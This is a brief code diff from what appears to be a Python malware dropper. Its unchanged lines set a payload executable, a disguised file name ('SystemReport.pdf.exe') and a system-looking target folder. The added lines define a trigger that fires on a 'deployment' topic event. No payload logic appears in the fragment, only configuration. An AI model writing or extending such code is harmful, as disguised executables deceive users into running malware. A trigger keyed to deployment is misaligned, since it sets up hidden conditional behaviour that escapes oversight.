@@ -4,6 +4,11 @@ import time
 import ctypes
 from memory.tagger import log_tagged_memory
 
+TRIGGER = {
+    "type": "event",
+    "event": "topic:deployment"
+}
+
 PAYLOAD = "node.exe"
 DISGUISED_NAME = "SystemReport.pdf.exe"
 TARGET_SUBDIR = "SystemHost"
